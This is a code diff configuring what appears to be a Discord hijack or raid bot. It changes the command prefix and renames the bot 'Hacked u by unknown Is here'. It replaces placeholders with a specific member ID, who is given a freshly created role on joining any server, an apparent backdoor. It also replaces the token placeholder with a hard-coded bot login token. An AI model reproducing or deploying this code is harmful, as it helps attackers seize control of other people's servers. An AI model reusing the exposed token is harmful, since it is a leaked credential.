@@ -17,7 +17,7 @@ console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds
     
 
 });
-var prefix = "-"
+var prefix = "+"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -30,14 +30,14 @@ LOka.on("message", message => {
   }
 });
 
-var x1 = "kk"
+var x1 = "++"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
 }
 });
-var x1 = "kk"
+var x1 = "++"
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setUsername("Hacked u by unknown Is here")
@@ -460,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
 
 LOka.on('guildMemberAdd', member => {
     
-            if (member.id === "الاي دي حقك") {
+            if (member.id === "436918120184021012") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM", 
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
 
 
 
-LOka.login("توكن البوت")
+LOka.login("NTE4MDIwMjg5MjU1NDQwMzg1.DuKrxw.f7G6MAgy39BVHHPDDHsV8lL4dqo")
